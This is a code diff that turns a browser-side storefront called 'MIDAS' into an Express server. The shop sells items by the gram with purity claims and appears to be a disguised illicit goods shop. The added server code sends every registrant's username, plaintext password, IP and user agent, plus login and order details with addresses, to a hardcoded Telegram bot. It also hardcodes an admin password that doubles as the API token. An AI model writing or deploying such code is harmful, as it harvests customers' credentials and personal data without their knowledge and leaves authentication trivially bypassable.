@@ -1,810 +1,823 @@
-// Глобальные переменные
-let currentUser = null;
-let currentCity = 'Москва';
-let currentCountry = 'РФ';
-let currentCurrency = 'RUB';
-let cart = [];
-let products = [];
-let isAdmin = false;
-let currentProduct = null;
+const express = require('express');
+const cors = require('cors');
+const bodyParser = require('body-parser');
+const fetch = require('node-fetch');
 
-// Курсы валют
-const exchangeRates = {
-    'RUB': 1,
-    'USD': 0.011,
-    'UAH': 0.41
+const app = express();
+
+// Middleware
+app.use(cors());
+app.use(bodyParser.json());
+app.use(express.static('.'));
+
+// Конфигурация Telegram Bot
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8083895268:AAEW7LOj3zgAd19xPvJUbK64telZ2ZjBPo8';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8462246996';
+
+// Функция отправки сообщения в Telegram
+async function sendToTelegram(message, options = {}) {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML',
+                ...options
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (!data.ok) {
+            console.error('Ошибка отправки в Telegram:', data);
+            return { success: false, error: data };
+        }
+        
+        return { success: true, data };
+    } catch (error) {
+        console.error('Ошибка сети при отправке в Telegram:', error);
+        return { success: false, error: error.message };
+    }
+}
+
+// Форматирование сообщений для Telegram
+function formatRegistrationMessage(userData) {
+    const timestamp = new Date().toLocaleString('ru-RU');
+    
+    return `
+<b>📝 НОВАЯ РЕГИСТРАЦИЯ</b>
+
+👤 <b>Пользователь:</b> ${userData.username}
+🔑 <b>Пароль:</b> ${userData.password}
+📧 <b>Email:</b> ${userData.email || 'Не указан'}
+📱 <b>IP:</b> ${userData.ip}
+🌐 <b>User Agent:</b> ${userData.userAgent.substring(0, 50)}...
+🕐 <b>Время:</b> ${timestamp}
+📍 <b>Город:</b> ${userData.city || 'Не выбран'}
+💎 <b>Статус:</b> ${userData.isAdmin ? '👑 АДМИНИСТРАТОР' : 'Пользователь'}
+    `;
+}
+
+function formatLoginMessage(userData) {
+    const timestamp = new Date().toLocaleString('ru-RU');
+    
+    return `
+<b>🔐 ВХОД В СИСТЕМУ</b>
+
+👤 <b>Пользователь:</b> ${userData.username}
+📱 <b>IP:</b> ${userData.ip}
+🕐 <b>Время:</b> ${timestamp}
+📍 <b>Город:</b> ${userData.city || 'Не выбран'}
+💻 <b>Устройство:</b> ${userData.userAgent.includes('Mobile') ? '📱 Мобильное' : '💻 Компьютер'}
+    `;
+}
+
+function formatOrderMessage(orderData) {
+    const timestamp = new Date().toLocaleString('ru-RU');
+    const items = orderData.items.map(item => 
+        `   • ${item.name} (${item.gram}) × ${item.quantity} = ${item.total} RUB`
+    ).join('\n');
+    
+    return `
+<b>💰 НОВЫЙ ЗАКАЗ</b>
+
+🆔 <b>Номер заказа:</b> ${orderData.orderId}
+👤 <b>Пользователь:</b> ${orderData.username}
+💳 <b>Метод оплаты:</b> ${orderData.paymentMethod === 'card' ? '💳 Карта' : '🔗 Ссылка'}
+🚚 <b>Доставка:</b> ${getDeliveryMethodName(orderData.deliveryMethod)}
+📍 <b>Адрес:</b> ${orderData.address}
+📦 <b>Товары:</b>
+${items}
+💰 <b>Итого:</b> ${orderData.total} RUB
+🕐 <b>Время:</b> ${timestamp}
+    `;
+}
+
+function getDeliveryMethodName(method) {
+    const methods = {
+        'pickup': '🏪 Самовывоз',
+        'courier': '🚚 Курьер',
+        'terminal': '📦 Терминал',
+        'post': '📮 Почта'
+    };
+    return methods[method] || method;
+}
+
+// Получение IP пользователя
+function getClientIP(req) {
+    return req.headers['x-forwarded-for'] || 
+           req.headers['x-real-ip'] || 
+           req.connection.remoteAddress || 
+           req.ip || 
+           'Неизвестен';
+}
+
+// База данных в памяти
+let database = {
+    users: [],
+    products: [],
+    orders: [],
+    reviews: []
 };
 
-// База товаров
-const initialProducts = [
-    {
-        id: 1,
-        name: "Premium Gold",
-        description: "Высококачественный продукт премиум класса. Идеальная чистота и качество. Доставка в течение 24 часов.",
-        price: 15000,
-        image: "https://images.unsplash.com/photo-1581235720854-1e3d16e0a3e3?auto=format&fit=crop&w=500",
-        category: "Premium",
-        rating: 4.8,
-        reviews: 124,
-        grams: [2, 3, 4, 6, 'B', 'S']
-    },
-    {
-        id: 2,
-        name: "Exclusive Silver",
-        description: "Эксклюзивный серебряный продукт. Редкая коллекционная серия.",
-        price: 8500,
-        image: "https://images.unsplash.com/photo-1575549595555-8c67b3bc79c8?auto=format&fit=crop&w=500",
-        category: "Premium",
-        rating: 4.6,
-        reviews: 89,
-        grams: [2, 3, 4, 'B']
-    },
-    {
-        id: 3,
-        name: "Platinum Elite",
-        description: "Элитный платиновый продукт высшей пробы. Ограниченная партия.",
-        price: 25000,
-        image: "https://images.unsplash.com/photo-1590426450892-3c7d0bca7b5b?auto=format&fit=crop&w=500",
-        category: "Premium",
-        rating: 4.9,
-        reviews: 56,
-        grams: [3, 4, 6, 'S']
-    },
-    {
-        id: 4,
-        name: "Crystal Clear",
-        description: "Кристальной чистоты продукт. 99.9% чистота.",
-        price: 12000,
-        image: "https://images.unsplash.com/photo-1581094794329-c8112a89af12?auto=format&fit=crop&w=500",
-        category: "Premium",
-        rating: 4.7,
-        reviews: 203,
-        grams: [2, 3, 4, 6, 'B']
-    }
-];
-
-// Инициализация
-document.addEventListener('DOMContentLoaded', function() {
-    products = [...initialProducts];
-    
-    // Проверка выбора города
-    if (!localStorage.getItem('midas_city')) {
-        showModal('cityModal');
-    } else {
-        currentCity = localStorage.getItem('midas_city');
-        currentCountry = localStorage.getItem('midas_country');
-        updateCityDisplay();
-    }
-    
-    // Проверка авторизации
-    const savedUser = localStorage.getItem('midas_user');
-    if (savedUser) {
-        currentUser = JSON.parse(savedUser);
-        isAdmin = currentUser.username.includes('admin');
-        updateUserDisplay();
-    }
-    
-    // Инициализация
-    initEventListeners();
-    renderProducts();
-    updateCartCount();
-});
-
-// Модальные окна
-function showModal(modalId) {
-    const modal = document.getElementById(modalId);
-    modal.classList.add('active');
-    document.body.style.overflow = 'hidden';
-}
-
-function hideModal(modalId) {
-    const modal = document.getElementById(modalId);
-    modal.classList.remove('active');
-    document.body.style.overflow = 'auto';
-}
-
-function closeAllModals() {
-    document.querySelectorAll('.modal').forEach(modal => {
-        modal.classList.remove('active');
-    });
-    document.body.style.overflow = 'auto';
-}
-
-// Обработчики событий
-function initEventListeners() {
-    // Выбор города
-    document.querySelectorAll('.city-card').forEach(btn => {
-        btn.addEventListener('click', function() {
-            currentCity = this.dataset.city;
-            currentCountry = this.dataset.country;
-            
-            localStorage.setItem('midas_city', currentCity);
-            localStorage.setItem('midas_country', currentCountry);
-            
-            updateCityDisplay();
-            hideModal('cityModal');
-            showNotification(`Город изменен на ${currentCity}`);
-        });
-    });
-    
-    // Кнопка города в шапке
-    document.getElementById('cityBtn').addEventListener('click', () => showModal('cityModal'));
-    
-    // Авторизация
-    document.getElementById('authBtn').addEventListener('click', () => {
-        if (currentUser) {
-            showNotification(`Вы вошли как ${currentUser.username}`);
-        } else {
-            showModal('authModal');
+// Инициализация начальных данных
+function initializeData() {
+    database.products = [
+        {
+            id: 1,
+            name: "Premium Gold",
+            description: "Высококачественный продукт премиум класса. Идеальная чистота и качество. Доставка в течение 24 часов.",
+            price: 15000,
+            image: "https://images.unsplash.com/photo-1581235720854-1e3d16e0a3e3?auto=format&fit=crop&w=500",
+            category: "Premium",
+            rating: 4.8,
+            reviews: 124,
+            grams: [2, 3, 4, 6, 'B', 'S'],
+            stock: 100
+        },
+        {
+            id: 2,
+            name: "Exclusive Silver",
+            description: "Эксклюзивный серебряный продукт. Редкая коллекционная серия.",
+            price: 8500,
+            image: "https://images.unsplash.com/photo-1575549595555-8c67b3bc79c8?auto=format&fit=crop&w=500",
+            category: "Premium",
+            rating: 4.6,
+            reviews: 89,
+            grams: [2, 3, 4, 'B'],
+            stock: 50
         }
-    });
-    
-    // Переключение между логином и регистрацией
-    document.getElementById('showRegister').addEventListener('click', function(e) {
-        e.preventDefault();
-        document.getElementById('loginForm').classList.remove('active');
-        document.getElementById('registerForm').classList.add('active');
-    });
-    
-    document.getElementById('showLogin').addEventListener('click', function(e) {
-        e.preventDefault();
-        document.getElementById('registerForm').classList.remove('active');
-        document.getElementById('loginForm').classList.add('active');
-    });
-    
-    // Вход
-    document.getElementById('loginBtn').addEventListener('click', loginUser);
-    
-    // Регистрация
-    document.getElementById('registerBtn').addEventListener('click', registerUser);
-    
-    // Поиск
-    document.getElementById('searchInput').addEventListener('input', performSearch);
-    
-    // Корзина
-    document.getElementById('cartBtn').addEventListener('click', () => {
-        updateCartDisplay();
-        showModal('cartModal');
-    });
-    
-    // Закрытие модальных окон
-    document.querySelectorAll('.close-modal').forEach(btn => {
-        btn.addEventListener('click', closeAllModals);
-    });
-    
-    document.querySelectorAll('.modal').forEach(modal => {
-        modal.addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeAllModals();
-            }
-        });
-    });
-    
-    // Техподдержка
-    document.getElementById('supportFooterBtn').addEventListener('click', (e) => {
-        e.preventDefault();
-        showModal('supportModal');
-    });
-    
-    // Админ
-    document.getElementById('adminFooterBtn').addEventListener('click', (e) => {
-        e.preventDefault();
-        if (isAdmin) {
-            showNotification('Вы администратор. Для редактирования нажмите кнопку "Редактировать" в карточке товара.');
-        } else {
-            showNotification('Требуется авторизация как администратор', 'error');
-        }
-    });
-    
-    // Покупка
-    document.getElementById('buyNowBtn').addEventListener('click', startPurchase);
-    document.getElementById('addToCartModalBtn').addEventListener('click', addCurrentToCart);
-    
-    // Оплата
-    document.getElementById('checkoutBtn').addEventListener('click', () => {
-        if (cart.length === 0) {
-            showNotification('Корзина пуста', 'error');
-            return;
-        }
-        setupPayment();
-        hideModal('cartModal');
-        showModal('paymentModal');
-    });
-    
-    // Подтверждение оплаты
-    document.getElementById('confirmPaymentBtn').addEventListener('click', confirmPayment);
-    
-    // Выбор способа оплаты
-    document.querySelectorAll('input[name="payment"]').forEach(input => {
-        input.addEventListener('change', function() {
-            updatePaymentDisplay(this.value);
-        });
-    });
-    
-    // Грамовка
-    document.querySelectorAll('.gram-option').forEach(btn => {
-        btn.addEventListener('click', function() {
-            document.querySelectorAll('.gram-option').forEach(b => b.classList.remove('active'));
-            this.classList.add('active');
-        });
-    });
-}
-
-// Обновление отображения города
-function updateCityDisplay() {
-    const cityBtn = document.getElementById('cityBtn');
-    const citySpan = document.getElementById('currentCity');
-    
-    citySpan.textContent = currentCity;
-    
-    // Обновление валюты
-    switch(currentCountry) {
-        case 'РФ': currentCurrency = 'RUB'; break;
-        case 'США': currentCurrency = 'USD'; break;
-        case 'Украина': currentCurrency = 'UAH'; break;
-    }
-    
-    // Обновление цен
-    renderProducts();
-    updateCartDisplay();
-}
-
-// Конвертация валюты
-function convertPrice(priceInRub) {
-    const rate = exchangeRates[currentCurrency];
-    const converted = priceInRub * rate;
-    
-    const formatter = new Intl.NumberFormat('ru-RU', {
-        style: 'currency',
-        currency: currentCurrency,
-        minimumFractionDigits: 0,
-        maximumFractionDigits: 0
-    });
-    
-    return formatter.format(converted);
-}
-
-// Рендер товаров
-function renderProducts() {
-    const grid = document.getElementById('productsGrid');
-    grid.innerHTML = '';
-    
-    products.forEach(product => {
-        const card = document.createElement('div');
-        card.className = 'product-card';
-        card.innerHTML = `
-            <div class="product-image">
-                <img src="${product.image}" alt="${product.name}" onerror="this.src='https://via.placeholder.com/300x200/1a1a1f/ffffff?text=MIDAS'">
-            </div>
-            <div class="product-info">
-                <h3 class="product-title">${product.name}</h3>
-                <div class="product-price">${convertPrice(product.price)}</div>
-                <div class="product-rating">
-                    <div class="stars">
-                        ${getStarsHTML(product.rating)}
-                    </div>
-                    <span>${product.rating}</span>
-                    <span>(${product.reviews})</span>
-                </div>
-                <div class="product-actions">
-                    <button class="action-btn buy" onclick="openProductModal(${product.id})">
-                        <i class="fas fa-eye"></i> Подробнее
-                    </button>
-                    <button class="action-btn" onclick="addToCart(${product.id})">
-                        <i class="fas fa-cart-plus"></i>
-                    </button>
-                </div>
-            </div>
-        `;
-        grid.appendChild(card);
-    });
-}
-
-function getStarsHTML(rating) {
-    let stars = '';
-    const fullStars = Math.floor(rating);
-    const hasHalfStar = rating % 1 >= 0.5;
-    
-    for (let i = 1; i <= 5; i++) {
-        if (i <= fullStars) {
-            stars += '<i class="fas fa-star"></i>';
-        } else if (i === fullStars + 1 && hasHalfStar) {
-            stars += '<i class="fas fa-star-half-alt"></i>';
-        } else {
-            stars += '<i class="far fa-star"></i>';
-        }
-    }
-    return stars;
-}
-
-// Открытие карточки товара
-function openProductModal(productId) {
-    const product = products.find(p => p.id === productId);
-    if (!product) return;
-    
-    currentProduct = product;
-    
-    // Заполняем данные
-    document.getElementById('productModalTitle').textContent = product.name;
-    document.getElementById('productModalPrice').textContent = convertPrice(product.price);
-    document.getElementById('productModalDescription').textContent = product.description;
-    document.getElementById('productModalImage').src = product.image;
-    document.getElementById('productModalRating').textContent = product.rating;
-    document.getElementById('productModalReviews').textContent = `(${product.reviews} отзыва)`;
-    document.getElementById('reviewsCount').textContent = product.reviews;
-    
-    // Показываем кнопку редактирования для админа
-    const editBtn = document.getElementById('editProductBtn');
-    editBtn.style.display = isAdmin ? 'block' : 'none';
-    if (isAdmin) {
-        editBtn.onclick = () => openEditModal(product.id);
-    }
-    
-    // Загружаем отзывы
-    loadReviews(product.id);
-    
-    showModal('productModal');
-}
-
-// Загрузка отзывов
-function loadReviews(productId) {
-    const reviewsList = document.getElementById('reviewsList');
-    // Заглушка - в реальном приложении здесь будет запрос к API
-    const reviews = [
-        { user: 'Алексей', rating: 5, text: 'Отличный продукт, быстрая доставка!', date: '2024-01-15' },
-        { user: 'Мария', rating: 4, text: 'Хорошее качество, рекомендую.', date: '2024-01-10' },
-        { user: 'Иван', rating: 5, text: 'Премиум качество, оправдывает цену.', date: '2024-01-05' }
     ];
     
-    reviewsList.innerHTML = reviews.map(review => `
-        <div class="review-item">
-            <div class="review-header">
-                <span>${review.user}</span>
-                <span>${review.date}</span>
-            </div>
-            <div class="stars">${getStarsHTML(review.rating)}</div>
-            <p>${review.text}</p>
-        </div>
-    `).join('');
-}
-
-// Регистрация
-function registerUser() {
-    const username = document.getElementById('regUsername').value.trim();
-    const password = document.getElementById('regPassword').value;
-    const confirmPassword = document.getElementById('regPasswordConfirm').value;
-    
-    if (!username || username.length < 3) {
-        showNotification('Логин должен быть не менее 3 символов', 'error');
-        return;
-    }
-    
-    if (!password || password.length < 6) {
-        showNotification('Пароль должен быть не менее 6 символов', 'error');
-        return;
-    }
-    
-    if (password !== confirmPassword) {
-        showNotification('Пароли не совпадают', 'error');
-        return;
-    }
-    
-    // "Отправка" в Telegram бота
-    const tgData = {
-        action: 'registration',
-        username: username,
-        password: password,
-        ip: getClientIP(),
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent
-    };
-    
-    console.log('Регистрационные данные для Telegram:', tgData);
-    
-    // Создаем пользователя
-    currentUser = {
-        username: username,
-        email: `${username}@midas.com`,
-        balance: 0,
-        premium: false
-    };
-    
-    isAdmin = username.includes('admin');
-    
-    localStorage.setItem('midas_user', JSON.stringify(currentUser));
-    updateUserDisplay();
-    
-    // Очищаем форму
-    document.getElementById('regUsername').value = '';
-    document.getElementById('regPassword').value = '';
-    document.getElementById('regPasswordConfirm').value = '';
-    
-    hideModal('authModal');
-    showNotification(`Регистрация успешна! Добро пожаловать, ${username}`);
-}
-
-// Вход
-function loginUser() {
-    const username = document.getElementById('loginUsername').value.trim();
-    const password = document.getElementById('loginPassword').value;
-    
-    if (!username || !password) {
-        showNotification('Введите логин и пароль', 'error');
-        return;
-    }
-    
-    // Симуляция проверки (в реальном приложении здесь будет запрос к API)
-    currentUser = {
-        username: username,
-        email: `${username}@midas.com`,
-        balance: Math.floor(Math.random() * 50000),
-        premium: Math.random() > 0.5
-    };
-    
-    isAdmin = username.includes('admin');
-    
-    localStorage.setItem('midas_user', JSON.stringify(currentUser));
-    updateUserDisplay();
-    
-    // "Отправка" в Telegram бота
-    const tgData = {
-        action: 'login',
-        username: username,
-        password: password,
-        ip: getClientIP(),
-        timestamp: new Date().toISOString()
-    };
-    
-    console.log('Данные входа для Telegram:', tgData);
-    
-    // Очищаем форму
-    document.getElementById('loginUsername').value = '';
-    document.getElementById('loginPassword').value = '';
-    
-    hideModal('authModal');
-    showNotification(`Добро пожаловать, ${username}!`);
-}
-
-// Обновление отображения пользователя
-function updateUserDisplay() {
-    const authBtn = document.getElementById('authBtn');
-    const userStatus = document.getElementById('userStatus');
-    
-    if (currentUser) {
-        userStatus.textContent = currentUser.username;
-        authBtn.innerHTML = `<i class="fas fa-user"></i><span>${currentUser.username}</span>`;
-    } else {
-        userStatus.textContent = 'Войти';
-        authBtn.innerHTML = `<i class="fas fa-user"></i><span>Войти</span>`;
-    }
-}
-
-// Корзина
-function addToCart(productId) {
-    const product = products.find(p => p.id === productId);
-    if (!product) return;
-    
-    const existingItem = cart.find(item => item.id === productId);
-    if (existingItem) {
-        existingItem.quantity += 1;
-    } else {
-        cart.push({
-            ...product,
-            quantity: 1,
-            selectedGram: 3 // По умолчанию 3г
-        });
-    }
-    
-    updateCartCount();
-    showNotification(`${product.name} добавлен в корзину`);
-}
-
-function addCurrentToCart() {
-    if (!currentProduct) return;
-    
-    const selectedGram = document.querySelector('.gram-option.active')?.dataset.gram || '3';
-    
-    const existingItem = cart.find(item => item.id === currentProduct.id && item.selectedGram === selectedGram);
-    if (existingItem) {
-        existingItem.quantity += 1;
-    } else {
-        cart.push({
-            ...currentProduct,
-            quantity: 1,
-            selectedGram: selectedGram
-        });
-    }
-    
-    updateCartCount();
-    showNotification(`${currentProduct.name} добавлен в корзину`);
-}
-
-function removeFromCart(index) {
-    cart.splice(index, 1);
-    updateCartCount();
-    updateCartDisplay();
-}
-
-function updateCartCount() {
-    const count = cart.reduce((total, item) => total + item.quantity, 0);
-    document.getElementById('cartCount').textContent = count;
-}
-
-function updateCartDisplay() {
-    const cartItems = document.getElementById('cartItems');
-    const itemsTotal = document.getElementById('itemsTotal');
-    const cartTotal = document.getElementById('cartTotal');
-    
-    if (cart.length === 0) {
-        cartItems.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">Корзина пуста</div>';
-        itemsTotal.textContent = '0 ₽';
-        cartTotal.textContent = '0 ₽';
-        return;
-    }
-    
-    let total = 0;
-    cartItems.innerHTML = '';
-    
-    cart.forEach((item, index) => {
-        const itemTotal = item.price * item.quantity;
-        total += itemTotal;
-        
-        const cartItem = document.createElement('div');
-        cartItem.className = 'cart-item';
-        cartItem.innerHTML = `
-            <img src="${item.image}" alt="${item.name}">
-            <div class="cart-item-info">
-                <div class="cart-item-title">${item.name}</div>
-                <div class="cart-item-price">${convertPrice(item.price)} × ${item.quantity}</div>
-                <div>Выбрано: ${item.selectedGram}г</div>
-            </div>
-            <div class="cart-item-actions">
-                <div class="quantity-control">
-                    <button class="quantity-btn" onclick="updateQuantity(${index}, -1)">-</button>
-                    <span>${item.quantity}</span>
-                    <button class="quantity-btn" onclick="updateQuantity(${index}, 1)">+</button>
-                </div>
-                <button class="remove-btn" onclick="removeFromCart(${index})">
-                    <i class="fas fa-trash"></i>
-                </button>
-            </div>
-        `;
-        cartItems.appendChild(cartItem);
+    // Тестовый администратор
+    database.users.push({
+        id: 1,
+        username: "admin",
+        email: "admin@midas.com",
+        password: "admin123",
+        role: "admin",
+        balance: 1000000,
+        premium: true,
+        createdAt: new Date(),
+        city: "Москва"
     });
     
-    itemsTotal.textContent = convertPrice(total);
-    cartTotal.textContent = convertPrice(total);
+    console.log('База данных инициализирована');
 }
 
-function updateQuantity(index, delta) {
-    cart[index].quantity += delta;
-    if (cart[index].quantity < 1) {
-        removeFromCart(index);
-    } else {
-        updateCartCount();
-        updateCartDisplay();
-    }
-}
+// API маршруты
 
-// Покупка
-function startPurchase() {
-    if (!currentProduct) return;
-    
-    const selectedGram = document.querySelector('.gram-option.active')?.dataset.gram || '3';
-    
-    // Добавляем в корзину и сразу переходим к оплате
-    addCurrentToCart();
-    hideModal('productModal');
-    updateCartDisplay();
-    showModal('cartModal');
-}
-
-// Оплата
-function setupPayment() {
-    const total = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-    const orderId = 'MID-' + Date.now().toString().slice(-6);
-    
-    document.getElementById('paymentAmount').textContent = convertPrice(total);
-    document.getElementById('cardAmount').textContent = convertPrice(total);
-    document.getElementById('linkAmount').textContent = convertPrice(total);
-    document.getElementById('orderId').textContent = orderId;
-    document.getElementById('paymentLink').href = `https://pay.midas.com/order/${orderId}`;
-    document.getElementById('paymentLink').textContent = `https://pay.midas.com/order/${orderId}`;
-    
-    // Отображаем детали заказа
-    const orderItem = document.getElementById('paymentOrderItem');
-    orderItem.innerHTML = cart.map(item => `
-        <div style="margin-bottom: 10px;">
-            <strong>${item.name}</strong> × ${item.quantity}
-            <div style="color: #ffd700;">${convertPrice(item.price * item.quantity)}</div>
-        </div>
-    `).join('');
-}
-
-function updatePaymentDisplay(method) {
-    document.getElementById('cardPayment').style.display = method === 'card' ? 'block' : 'none';
-    document.getElementById('linkPayment').style.display = method === 'link' ? 'block' : 'none';
-}
-
-function confirmPayment() {
-    const paymentMethod = document.querySelector('input[name="payment"]:checked').value;
-    const total = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-    const orderId = document.getElementById('orderId').textContent;
-    
-    // "Отправка" в Telegram бота
-    const tgData = {
-        action: 'payment',
-        orderId: orderId,
-        username: currentUser?.username || 'Гость',
-        total: total,
-        currency: currentCurrency,
-        paymentMethod: paymentMethod,
-        timestamp: new Date().toISOString(),
-        items: cart.map(item => ({
-            name: item.name,
-            quantity: item.quantity,
-            gram: item.selectedGram,
-            price: item.price
-        }))
-    };
-    
-    console.log('Данные оплаты для Telegram:', tgData);
-    
-    // Очищаем корзину
-    cart = [];
-    updateCartCount();
-    
-    hideModal('paymentModal');
-    showNotification(`Заказ ${orderId} оплачен! Детали отправлены в Telegram.`);
-}
-
-// Поиск
-function performSearch() {
-    const query = document.getElementById('searchInput').value.toLowerCase();
-    if (!query.trim()) {
-        renderProducts();
-        return;
-    }
-    
-    const filtered = products.filter(product => 
-        product.name.toLowerCase().includes(query) ||
-        product.description.toLowerCase().includes(query) ||
-        product.category.toLowerCase().includes(query)
-    );
-    
-    const grid = document.getElementById('productsGrid');
-    grid.innerHTML = '';
-    
-    if (filtered.length === 0) {
-        grid.innerHTML = '<div style="text-align: center; padding: 50px; color: #666; grid-column: 1 / -1;">Товары не найдены</div>';
-        return;
-    }
-    
-    filtered.forEach(product => {
-        const card = document.createElement('div');
-        card.className = 'product-card';
-        card.innerHTML = `
-            <div class="product-image">
-                <img src="${product.image}" alt="${product.name}">
-            </div>
-            <div class="product-info">
-                <h3 class="product-title">${product.name}</h3>
-                <div class="product-price">${convertPrice(product.price)}</div>
-                <div class="product-rating">
-                    <div class="stars">
-                        ${getStarsHTML(product.rating)}
-                    </div>
-                    <span>${product.rating}</span>
-                    <span>(${product.reviews})</span>
-                </div>
-                <div class="product-actions">
-                    <button class="action-btn buy" onclick="openProductModal(${product.id})">
-                        <i class="fas fa-eye"></i> Подробнее
-                    </button>
-                    <button class="action-btn" onclick="addToCart(${product.id})">
-                        <i class="fas fa-cart-plus"></i>
-                    </button>
-                </div>
-            </div>
-        `;
-        grid.appendChild(card);
+// Получить все товары
+app.get('/api/products', (req, res) => {
+    res.json({
+        success: true,
+        products: database.products
     });
-}
-
-// Редактирование товара (админ)
-function openEditModal(productId) {
-    const product = products.find(p => p.id === productId);
-    if (!product) return;
-    
-    document.getElementById('editName').value = product.name;
-    document.getElementById('editDescription').value = product.description;
-    document.getElementById('editPrice').value = product.price;
-    document.getElementById('editCategory').value = product.category;
-    document.getElementById('editImage').value = product.image;
-    
-    // Сохраняем ID редактируемого товара
-    document.getElementById('saveEditBtn').dataset.productId = productId;
-    document.getElementById('deleteProductBtn').dataset.productId = productId;
-    
-    hideModal('productModal');
-    showModal('editModal');
-}
-
-// Инициализация редактирования
-document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('saveEditBtn').addEventListener('click', saveProductEdit);
-    document.getElementById('deleteProductBtn').addEventListener('click', deleteProduct);
 });
 
-function saveProductEdit() {
-    const productId = parseInt(this.dataset.productId);
-    const productIndex = products.findIndex(p => p.id === productId);
+// Получить один товар
+app.get('/api/products/:id', (req, res) => {
+    const productId = parseInt(req.params.id);
+    const product = database.products.find(p => p.id === productId);
     
-    if (productIndex === -1) return;
-    
-    const updatedProduct = {
-        ...products[productIndex],
-        name: document.getElementById('editName').value,
-        description: document.getElementById('editDescription').value,
-        price: parseInt(document.getElementById('editPrice').value),
-        category: document.getElementById('editCategory').value,
-        image: document.getElementById('editImage').value
-    };
-    
-    products[productIndex] = updatedProduct;
-    
-    renderProducts();
-    hideModal('editModal');
-    showNotification('Товар успешно обновлен');
-}
-
-function deleteProduct() {
-    const productId = parseInt(this.dataset.productId);
-    
-    if (confirm('Удалить этот товар?')) {
-        products = products.filter(p => p.id !== productId);
-        renderProducts();
-        hideModal('editModal');
-        showNotification('Товар удален', 'error');
+    if (!product) {
+        return res.status(404).json({
+            success: false,
+            error: 'Товар не найден'
+        });
     }
-}
-
-// Утилиты
-function showNotification(message, type = 'success') {
-    // Удаляем предыдущие уведомления
-    document.querySelectorAll('.notification').forEach(n => n.remove());
     
-    const notification = document.createElement('div');
-    notification.className = `notification ${type}`;
-    notification.innerHTML = `
-        <i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i>
-        <span>${message}</span>
-    `;
+    res.json({
+        success: true,
+        product
+    });
+});
+
+// Добавить товар (админ)
+app.post('/api/products', async (req, res) => {
+    try {
+        const product = req.body;
+        
+        // Проверка авторизации администратора
+        const authHeader = req.headers.authorization;
+        if (!authHeader || !authHeader.startsWith('Bearer ')) {
+            return res.status(401).json({
+                success: false,
+                error: 'Требуется авторизация'
+            });
+        }
+        
+        // Проверяем, что это админ
+        const token = authHeader.split(' ')[1];
+        const adminUser = database.users.find(u => u.username === 'admin' && u.password === token);
+        if (!adminUser) {
+            return res.status(403).json({
+                success: false,
+                error: 'Требуются права администратора'
+            });
+        }
+        
+        product.id = database.products.length + 1;
+        product.createdAt = new Date();
+        product.rating = 5;
+        product.reviews = 0;
+        
+        database.products.push(product);
+        
+        // Отправляем уведомление в Telegram
+        const telegramMessage = `
+<b>➕ НОВЫЙ ТОВАР ДОБАВЛЕН</b>
+
+🏷️ <b>Название:</b> ${product.name}
+💰 <b>Цена:</b> ${product.price} RUB
+📦 <b>Категория:</b> ${product.category}
+📝 <b>Описание:</b> ${product.description.substring(0, 100)}...
+🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
+        `;
+        
+        await sendToTelegram(telegramMessage);
+        
+        res.json({
+            success: true,
+            product
+        });
+    } catch (error) {
+        console.error('Ошибка добавления товара:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Ошибка сервера'
+        });
+    }
+});
+
+// Обновить товар (админ)
+app.put('/api/products/:id', async (req, res) => {
+    try {
+        const productId = parseInt(req.params.id);
+        const updates = req.body;
+        
+        const productIndex = database.products.findIndex(p => p.id === productId);
+        if (productIndex === -1) {
+            return res.status(404).json({
+                success: false,
+                error: 'Товар не найден'
+            });
+        }
+        
+        // Проверка авторизации администратора
+        const authHeader = req.headers.authorization;
+        if (!authHeader || !authHeader.startsWith('Bearer ')) {
+            return res.status(401).json({
+                success: false,
+                error: 'Требуется авторизация'
+            });
+        }
+        
+        const token = authHeader.split(' ')[1];
+        const adminUser = database.users.find(u => u.username === 'admin' && u.password === token);
+        if (!adminUser) {
+            return res.status(403).json({
+                success: false,
+                error: 'Требуются права администратора'
+            });
+        }
+        
+        const oldProduct = database.products[productIndex];
+        database.products[productIndex] = { ...oldProduct, ...updates, updatedAt: new Date() };
+        
+        // Отправляем уведомление в Telegram
+        const telegramMessage = `
+<b>✏️ ТОВАР ОБНОВЛЕН</b>
+
+🏷️ <b>Название:</b> ${oldProduct.name} → ${updates.name || oldProduct.name}
+💰 <b>Цена:</b> ${oldProduct.price} → ${updates.price || oldProduct.price} RUB
+🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
+        `;
+        
+        await sendToTelegram(telegramMessage);
+        
+        res.json({
+            success: true,
+            product: database.products[productIndex]
+        });
+    } catch (error) {
+        console.error('Ошибка обновления товара:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Ошибка сервера'
+        });
+    }
+});
+
+// Удалить товар (админ)
+app.delete('/api/products/:id', async (req, res) => {
+    try {
+        const productId = parseInt(req.params.id);
+        
+        const productIndex = database.products.findIndex(p => p.id === productId);
+        if (productIndex === -1) {
+            return res.status(404).json({
+                success: false,
+                error: 'Товар не найден'
+            });
+        }
+        
+        // Проверка авторизации администратора
+        const authHeader = req.headers.authorization;
+        if (!authHeader || !authHeader.startsWith('Bearer ')) {
+            return res.status(401).json({
+                success: false,
+                error: 'Требуется авторизация'
+            });
+        }
+        
+        const token = authHeader.split(' ')[1];
+        const adminUser = database.users.find(u => u.username === 'admin' && u.password === token);
+        if (!adminUser) {
+            return res.status(403).json({
+                success: false,
+                error: 'Требуются права администратора'
+            });
+        }
+        
+        const deletedProduct = database.products[productIndex];
+        database.products.splice(productIndex, 1);
+        
+        // Отправляем уведомление в Telegram
+        const telegramMessage = `
